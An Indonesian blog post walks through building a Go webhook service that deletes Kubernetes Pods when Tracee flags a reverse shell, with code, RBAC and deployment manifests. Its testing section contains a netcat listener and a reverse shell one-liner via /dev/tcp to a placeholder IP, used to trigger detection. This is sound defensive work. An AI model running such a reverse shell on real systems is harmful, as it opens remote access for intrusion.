@@ -1,0 +1,434 @@
+---
+title: Mematikan Pod Secara Otomatis Saat Tracee Mendeteksi Bahaya
+date: 2024-11-08
+tags: [Kubernetes, Go]
+excerpt: Pada suatu hari, saya membaca tentang proyek [falco-talon](https://github.com/falcosecurity/falco-talon) yang disebut sebagai Response Engine untuk threats di Kubernetes.  Saya sudah pernah memakai [falco](https://github.com/falcosecurity/falco) untuk mendeteksi keanehan pada setiap Pod yang berjalan di Kubernetes. Dengan `falco-talon`, setiap *alert* dari `falco` dapat diubah menjadi respon otomatis seperti men-*kill* (mematikan) Pod bersangkutan, meng-isolasi *cluster* dengan fitur *cordon* dari Kubernetes, dan sebagainya.  Lalu bagaimana bila saya menggunakan [Tracee](https://github.com/aquasecurity/tracee)?  Terinspirasi oleh `falco-talon`, saya akan mencoba menambahkan fasilitas respon otomatis yang akan men-*kill* Pod berdasarkan *alert* dari Tracee.  Karena biasanya Pod dikelola oleh Deployment, Kubernetes akan membuat ulang Pod yang di-*kill* secara otomatis, sehingga operasi ini relatif aman....
+---
+
+import { FileTree } from '@astrojs/starlight/components';
+
+Pada suatu hari, saya membaca tentang proyek [falco-talon](https://github.com/falcosecurity/falco-talon) yang disebut sebagai Response Engine untuk threats di Kubernetes.  Saya sudah pernah memakai [falco](https://github.com/falcosecurity/falco) untuk mendeteksi keanehan pada setiap Pod yang berjalan di Kubernetes. Dengan `falco-talon`, setiap *alert* dari `falco` dapat diubah menjadi respon otomatis seperti men-*kill* (mematikan) Pod bersangkutan, meng-isolasi *cluster* dengan fitur *cordon* dari Kubernetes, dan sebagainya.  Lalu bagaimana bila saya menggunakan [Tracee](https://github.com/aquasecurity/tracee)?  Terinspirasi oleh `falco-talon`, saya akan mencoba menambahkan fasilitas respon otomatis yang akan men-*kill* Pod berdasarkan *alert* dari Tracee.  Karena biasanya Pod dikelola oleh Deployment, Kubernetes akan membuat ulang Pod yang di-*kill* secara otomatis, sehingga operasi ini relatif aman.
+
+:::caution
+*Behaviour detection* seperti Falco dan Tracee sangat rentan terhadap *false positive*.  Sebagai contoh, aktifitas yang sah seperti tim DevOps masuk ke Pod untuk troubleshooting mendadak akan men-*trigger* *alert* karena ini termasuk *behavior* yang perlu dideteksi (*advisory* akan melakukan hal serupa untuk mendapatkan akses *shell* di Pod).
+
+Pada saat menerapkan respon otomatis pada *false positive*, walaupun Pod yang dimatikan akan dibuat ulang secara otomatis, tetap saja akan memberikan dampak pada kinerja dan stabilitas.  Hal ini karena karena Pod akan terus menerus dibuat ulang walaupun tidak ada insiden keamanan.
+:::
+
+## Kode Program
+
+Saya akan mulai dengan membuat sebuah aplikasi Go yang akan menerima webhook dari Tracee.  Aplikasi ini kemudian akan men-*kill* Pod yang terkait dengan *alert* tersebut dengan menggunakan API Kubernetes.  Jenis aplikasi ini adalah *in-cluster* karena aplikasi yang memanggil API Kubernetes berada di *cluster* yang sama.  Ini lebih aman karena *service account* disuntikkan langsung ke Pod tanpa harus disimpan terpisah (yang rentan terhadap kebocoran).
+
+Untuk mempermudah pemanggilan API Kubernetes, saya akan menggunakan *client* resmi Kubernetes untuk Go dengan menjalankan perintah berikut ini:
+
+```shell
+$ go get k8s.io/client-go@latest
+
+# Output:
+# go: downloading k8s.io/client-go v0.31.2
+# go: added k8s.io/client-go v0.31.2
+```
+
+Saya kemudian akan membuat file dengan stuktur folder seperti berikut ini:
+
+<FileTree>
+- cmd
+  - alert-responder
+    - main.go
+- internal
+  - log
+    - tracee_log.go
+  - pod
+    - pod_killer.go
+- Dockerfile
+</FileTree>
+
+### pod_killer.go
+
+Kode program `pod_killer.go` terlihat seperti berikut ini:
+
+```go title="internal/pod/pod_killer.go"
+package pod
+
+import (
+	"context"
+	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+	"k8s.io/client-go/kubernetes"
+	"k8s.io/client-go/rest"
+	"log"
+)
+
+var queue chan Pod
+var clientset *kubernetes.Clientset
+
+func AddPodToKill(podName string, namespace string) {
+	pod := Pod{Name: podName, Namespace: namespace}
+	select {
+	case queue <- pod:
+	default:
+	}
+	log.Printf("Pod [%s][%s] has been added to kill queue.\n", podName, namespace)
+}
+
+func StartQueue() {
+	config, err := rest.InClusterConfig()
+	if err != nil {
+		log.Fatalf("Failed to connect to in-cluster Kubernetes API: %s\n", err)
+	}
+	clientset = kubernetes.NewForConfigOrDie(config)
+	queue = make(chan Pod, 100)
+	for pod := range queue {
+		err = pod.Kill()
+		if err != nil {
+			log.Printf("Failed to delete pod [%s][%s]: %s\n", pod.Namespace, pod.Name, err)
+		}
+	}
+}
+
+type Pod struct {
+	Name      string
+	Namespace string
+}
+
+func (p *Pod) Kill() error {
+	log.Printf("Killing pod [%s][%s]...\n", p.Namespace, p.Name)
+	return clientset.CoreV1().Pods(p.Namespace).Delete(context.TODO(), p.Name, metav1.DeleteOptions{})
+}
+```
+
+Karena ada kemungkinan aplikasi ini dipanggil berulang kali dalam waktu singkat, agar tetap responsif (bisa mengembalikan hasil paling lama 5 detik), saya menggunakan *channel* sebagai *buffer* dengan definisi seperti `make(chan Pod, 100)`.  Penggunaan `for` pada `StartQueue()`  tidak akan pernah selesai, sehingga `StartQueue()` perlu dipanggil di sebuah *thread* terpisah dengan *goroutine*.  Dengan demikian, proses penghapusan Pod akan dilakukan di *thread* tersendiri yang masih akan diproses bahkan setelah *HTTP request* dari *webhook* sudah selesai.
+
+Untuk menambahkan Pod yang perlu dihapus, pada kode program di atas, saya membuat function `AddPodToKill()`.  Pada function tersebut, saya menggunakan `select` saat mengirim `pod` ke *channel* sehingga sifatnya adalah *non-blocking*.  Baris `queue <- pod` akan langsung lanjut ke perintah berikutnya tanpa menunggu dibaca.  Selain itu, karena isi `default` di `select` kosong, bila seandainya *buffer* sudah penuh (terdapat 100 Pod yang masih belum diproses), Pod baru akan diabaikan begitu saja.
+
+Sebelum dapat memanggil Kubernetes API, saya perlu melakukan inisialisi *client* terlebih dahulu.  Pada kode program di atas, karena Kubernetes API dipanggil dari dalam *cluster* secara *internal*, saya menggunakan `rest.InClusterConfig()`.  Kode program yang menghapus Pod cukup sederhana dah hanya satu baris dalam bentuk seperti `clientset.CoreV1().Pods(nama_namespace).Delete(context.TODO(), nama_pod, metav1.DeleteOptions{})`.
+
+### tracee_log.go
+
+Kode program `tracee_log.go` terlihat seperti berikut ini:
+
+```go title="internal/lang/tracee_log.go"
+package log
+
+import (
+	"encoding/json"
+	"fmt"
+)
+
+func GetPodName(log string) (string, string, error) {
+	var req interface{}
+	err := json.Unmarshal([]byte(log), &req)
+	if err != nil {
+		return "", "", err
+	}
+	kubernetes, ok := req.(map[string]interface{})["kubernetes"]
+	if !ok {
+		return "", "", fmt.Errorf("'kubernetes' not found")
+	}
+	podName, ok := kubernetes.(map[string]interface{})["podName"]
+	if !ok {
+		return "", "", fmt.Errorf("'kubernetes.podName' not found")
+	}
+	podNamespace, ok := kubernetes.(map[string]interface{})["podNamespace"]
+	if !ok {
+		return "", "", fmt.Errorf("'kubernetes.podNamespace' not found")
+	}
+	metadata, ok := req.(map[string]interface{})["metadata"]
+	if !ok {
+		return "", "", fmt.Errorf("'metadata' not found")
+	}
+	properties, ok := metadata.(map[string]interface{})["Properties"]
+	if !ok {
+		return "", "", fmt.Errorf("'metadata.Properties' not found")
+	}
+	signatureId, ok := properties.(map[string]interface{})["signatureID"]
+	if !ok {
+		return "", "", fmt.Errorf("'metadata.Properties.signatureID' not found")
+	}
+	if signatureId == "TRC-101" {
+		return podName.(string), podNamespace.(string), nil
+	}
+	return "", "", fmt.Errorf("no action for rule %s", signatureId)
+}
+```
+
+Kode program di atas pada dasar melakukan *parsing* JSON yang dikirim oleh Tracee menjadi `map` di variabel `req`.  Saya perlu mengambil nilai `kubernetes.podName` dan `kubernetes.podNamespace`.  Hanya *alert* yang datang dari Pod (di dalam *container*) yang akan memiliki nilai tersebut.  Alert dari *host* tidak akan memiliki nilai `kubernetes` dan `container`.
+
+:::note
+Respon otomatis untuk alert dari *host* bisa dalam bentuk penggunaan fasilitas *cordon* dari Kubernetes.  Dengan menggunakan *cordon*, seluruh Pod dari *node* bersangkutan akan dipindahkan ke *node* lain dan tidak akan ada Pod baru yang berjalan pada *node* tersebut lagi.  Ini memberikan peluang bagi responder untuk memeriksa *node* sebelum memutuskan untuk menghapus *node* tersebut.
+:::
+
+Selain itu, sangat tidak realistis untuk melakukan respon otomatis untuk setiap alert dari Tracee karena ada sangat banyak *false positive*.  Sebagai latihan, saya hanya akan menghapus Pod secara otomatis bila terdeteksi *signature* `TRC-101` yang mendeteksi operasi *reverse shell*.
+
+### main.go
+
+Kode program `main.go` terlihat seperti berikut ini:
+
+```go
+package main
+
+import (
+	traceeLog "alert-responder/internal/log"
+	"alert-responder/internal/pod"
+	"fmt"
+	"io"
+	"log"
+	"net/http"
+)
+
+func main() {
+	log.Println("Starting alert-responder...")
+	go pod.StartQueue()
+	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPost {
+			log.Printf("Invalid request method [%s]\n", r.Method)
+			http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
+			return
+		}
+		log.Printf("Handling request from %s\n", r.RemoteAddr)
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			errString := fmt.Sprintf("error reading input: %s", err)
+			log.Println(errString)
+			http.Error(w, errString, http.StatusBadRequest)
+		}
+		podName, namespace, err := traceeLog.GetPodName(string(body))
+		if err != nil {
+			log.Printf("Failed to parse pod name: %s", err)
+			return
+		}
+		log.Printf("Found pod [%s] in namespace [%s]\n", podName, namespace)
+		pod.AddPodToKill(podName, namespace)
+	})
+	log.Fatal(http.ListenAndServe(":8080", nil))
+}
+```
+
+Kode program di atas pada dasarnya menjalankan *web server* di port `8080` yang akan dipanggil sebagai *webhook* bagi Tracee.
+
+Setelah selesai menulis kode program, saya menjalankan perintah berikut ini untuk memastikan bahwa seluruh *dependency* sudah ditambahkan di file `go.mod`:
+
+```shell
+$ go mod tidy
+```
+
+## Deployment
+
+### Image
+
+Untuk membuat *image* dari kode program di atas, saya akan menambahkan `Dockerfile` dengan isi seperti berikut ini:
+
+```dockerfile
+FROM golang:1.23.1 AS build
+WORKDIR /app
+COPY go.mod go.sum ./
+RUN go mod download
+COPY /cmd/ ./cmd/
+COPY /internal ./internal/
+RUN GCO_ENABLED=0 GOOS=linux go build -o /alert-responder ./cmd/alert-responder
+
+FROM gcr.io/distroless/base-debian12 AS release
+WORKDIR /
+COPY --from=build /alert-responder /alert-responder
+EXPOSE 8080
+USER nonroot:nonroot
+ENTRYPOINT ["/alert-responder"]
+```
+
+Pada deklarasi di atas, saya menggunakan *multi-stage build* dimana aplikasi `alert-responder` di-*build* dengan *base image* Go 1.23.1.  Setelah file *binary* berhasil dibuat, ia akan di-*deploy* di *base image distroless* dengan user `nonroot`.  Dengan demikian, saya tidak perlu menyertakan instalasi Go pada *image* yang dihasilkan.
+
+:::note
+[Distroless](https://github.com/GoogleContainerTools/distroless) adalah *image* minimum dari Google yang tidak mengandung aplikasi tambahan seperti *package manager*, *shell* dan sebagainya.  Selain ini membuat ukuran *image* lebih kecil, ia juga lebih aman karena mengurangi *attack surface* yang ada.
+:::
+
+Saya kemudian membuat *image* dengan perintah seperti berikut ini:
+
+```shell
+$ docker build -t alert-responder:latest .
+```
+
+### RBAC
+
+Untuk menjalankan *image* ini di Kubernetes, saya perlu membuat *manifest*-nya.  Karena Kubernetes modern kebanyakan sudah mengaktifkan RBAC dan *image* di atas membutuhkan *permission* untuk menghapus *pod* secara global, saya akan mendefinisikan objek untuk RBAC terlebih dahulu pada file *manifest*:
+
+```yaml title="deployment.yaml"
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: alert-responder-service-account
+  namespace: tracee
+---
+
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: alert-responder-role
+rules:
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["delete"]
+---
+
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: alert-responder-role-binding
+subjects:
+  - kind: ServiceAccount
+    name: alert-responder-service-account
+    namespace: tracee
+roleRef:
+  kind: ClusterRole
+  name: alert-responder-role
+  apiGroup: rbac.authorization.k8s.io
+---
+```
+
+Pada definisi RBAC di atas, saya mendefinisikan sebuah ServiceAccount yang akan dipakai oleh Pod nantinya.  Saya juga membuat *role* baru dengan jenis ClusterRole karena saya ingin `alert-responder` bisa mematikan (*kill*) Pod yang berada dimana saja.  Bila ingin membatasi Pod  yang bisa dimatikan hanya di *namespace* tertentu, saya bisa mengganti ClusterRole dengan Role.
+
+### Deployment & Service
+
+Setelah itu, agar bisa menjalankan *image* sebagai Deployment di Kubernetes, saya akan menambahkan definisi berikut ini:
+
+```yaml title="deployment.yaml"
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: alert-responder
+  namespace: tracee
+  labels:
+    app: alert-responder
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: alert-responder
+  template:
+    metadata:
+      labels:
+        app: alert-responder
+    spec:
+      serviceAccountName: alert-responder-service-account
+      containers:
+        - name: alert-responder
+          image: alert-responder:latest
+          ports:
+            - containerPort: 8080
+              name: http-rest
+---
+```
+
+Definisi di atas akan membuat sebuah Pod tunggal untuk menjalankan `alert-responder` di namespace `tracee`.  Pod ini memiliki port `8080` yang bisa digunakan untuk mengakses aplikasi.  Agar *port* ini bisa dipanggil oleh Tracee nantinya, saya perlu membuat *headless service* seperti pada definisi berikut ini:
+
+```yaml title="deployment.yaml"
+apiVersion: v1
+kind: Service
+metadata:
+  name: alert-responder
+  namespace: tracee
+spec:
+  clusterIP: None
+  selector:
+    app: alert-responder
+---
+```
+
+Perbedaan *headless service* dan Service biasa adalah nilai `clusterIP`-nya yang berupa `None`.  Dengan demikian, *headless service* tidak bisa diakses dari luar melalui alamat IP (seperti diakses secara publik lewat *load balancer*).  Walaupun demikian, *headless service* tetap bisa dipanggil oleh *workload* lainnya dengan menggunakan DNS record internal yang dikelola Kubernetes dengan nama seperti `[nama headless service].[nama namespace].svc.[domain cluster]`.  Dengan demikian, Pod `alert-responder` yang saya buat bisa dipanggil dengan menggunakan nama berupa `alert-responder.tracee.svc.cluster.local`.
+
+:::note
+Bila terdapat lebih dari satu *pod* untuk sebuah *headless service*, IP internal masing-masing Pod akan terdaftar sebagai A record untuk nama DNS *headless service* tersebut.  Sebagai contoh, bila saya mengubah nilai `replicas` menjadi `3`, akan ada 3 nilai A record di DNS *headless service* seperti yang terlihat pada hasil perintah `dig` berikut ini:
+
+```shell
+$ dig alert-responder.tracee.svc.cluster.local
+
+#
+# Output:
+# ...
+# ;; ANSWER SECTION:
+# alert-responder.tracee.svc.cluster.local. 30 IN	A 10.244.0.22
+# alert-responder.tracee.svc.cluster.local. 30 IN	A 10.244.0.21
+# alert-responder.tracee.svc.cluster.local. 30 IN	A 10.244.0.23
+# ...
+```
+
+Dengan demikian, *headless service* memiliki *load balancing* dalam bentuk yang sangat sederhana yang bergantung pada DNS.  Setiap kali DNS query dilakukan, urutan IP di atas akan dikembalikan secara acak dengan harapan tidak semua *request* mengarah ke IP yang sama.
+:::
+
+Terakhir, saya akan menambahkan sebuah Deployment `nginx` yang akan dijadikan sebagai target pengujian dengan definisi seperti berikut ini:
+
+```yaml title="deployment.yaml"
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx
+  labels:
+    app: nginx
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:
+      containers:
+        - name: nginx
+          image: ubuntu/nginx:latest
+          imagePullPolicy: IfNotPresent
+---
+```
+
+Saya bisa men-*deploy* *manifest* Kubernetes yang telah saya tulis dengan menggunakan perintah seperti berikut ini:
+
+```shell
+$ kubectl apply -f deployment.yaml
+```
+
+### Tracee
+
+Selanjutnya, saya perlu melakukan perubahan pada file konfigurasi Tracee dengan menambahkan `webhook` pada nilai `output` seperti berikut ini:
+
+```yaml
+output:
+  webhook:
+    - alert-responder:
+        protocol: http
+        host: alert-responder.tracee.svc.cluster.local
+        port: 8080
+        timeout: 5s
+        content-type: application/json
+```
+
+Bila ini adalah *cluster* kosong, saya bisa mengatur nilai *webhook* ini pada saat melakukan instalasi Tracee lewat Helm dengan perintah seperti berikut ini:
+
+```shell
+$ helm install tracee aqua/tracee --namespace tracee --create-namespace \
+  --set config.output.webhook.host=alert-responder.tracee.svc.cluster.local \
+  --set config.output.webhook.port=8080 \
+  --set config.output.webhook.timeout=5s \
+  --set config.output.webhook.content-type=application/json
+```
+
+Sampai disini, proses *deployment* sudah selesai dan saya siap melakukan pengujian untuk memastikan `alert-responder` bekerja sesuai dengan harapan!
+
+## Pengujian
+
+Untuk melakukan pengujian, saya akan mencoba membuat *reverse shell* pada Pod `nginx`.  Langkah pertama yang saya lakukan adalah membuat *listener* di sebuah server publik dengan perintah seperti berikut ini:
+
+```shell
+$ nc -lvnp 8888
+```
+
+Lalu, saya akan masuk ke dalam Pod `nginx` dengan menggunakan perintah berikut ini:
+
+```shell {"10.10.10.10"}
+$ kubectl exec -it deployment/nginx -- bash
+root@nginx:/# sh -i >& /dev/tcp/10.10.10.10/8888 0>&1
+##
+## Output:
+## command terminated with exit code 137
+##
+```
+
+Pada perintah di atas, saya perlu mengganti nilai `10.10.10.10` dengan IP server publik yang saya pakai.  Namun, begitu saya menekan tombol Enter, saya langsung menemukan perintah `command terminated` dan shell akan ditutup.  Bila saya menggunakan perintah `kubectl get pods`, saya akan menemukan bahwa Pod yang saya pakai sudah tidak ada, digantikan oleh Pod yang masih baru (terlihat dari nilai di kolom `AGE`).  Dengan demikian, aplikasi tidak akan *down* (`nginx` masih tetap bisa diakses).
